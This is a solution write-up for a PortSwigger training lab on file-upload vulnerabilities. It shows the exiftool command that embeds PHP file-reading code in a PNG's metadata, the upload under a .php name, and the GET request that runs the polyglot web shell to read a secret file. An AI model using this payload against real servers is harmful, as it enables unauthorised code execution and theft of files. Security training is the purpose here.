# Remote code execution via polyglot web shell upload

**Lab Url**: [https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

## Objective

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The server validates file content by checking the magic bytes to ensure it's a genuine image. A polyglot file — valid as both a PNG image and a PHP script — bypasses this check while still allowing server-side code execution.

A pre-prepared polyglot shell is available at [`assets/shell.png`](assets/shell.png).

### Creating the polyglot shell

The polyglot was created by injecting PHP code into a valid PNG's metadata using `exiftool`:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" shell.png
```

The resulting file is a valid PNG (passes content checks) and contains executable PHP code in its EXIF metadata. When processed by the PHP engine, the `<?php ... ?>` tag is executed regardless of its location within the file.

### Step 1: Upload the polyglot shell

Upload the file via the avatar upload form. Use a `.php` extension in the filename (e.g., `exploit.php`) — the content check passes because the file is a valid PNG, and the `.php` extension causes the server to execute it rather than serve it as a static image.

The server accepts the file and stores it — typically at `/files/avatars/exploit.php`.

### Step 2: Retrieve the secret

Visit the uploaded shell:

```
GET /files/avatars/exploit.php
```

The PHP engine processes the file, executing the embedded `<?php ... ?>` tag and returning the contents of `/home/carlos/secret`. Submit this secret to solve the lab.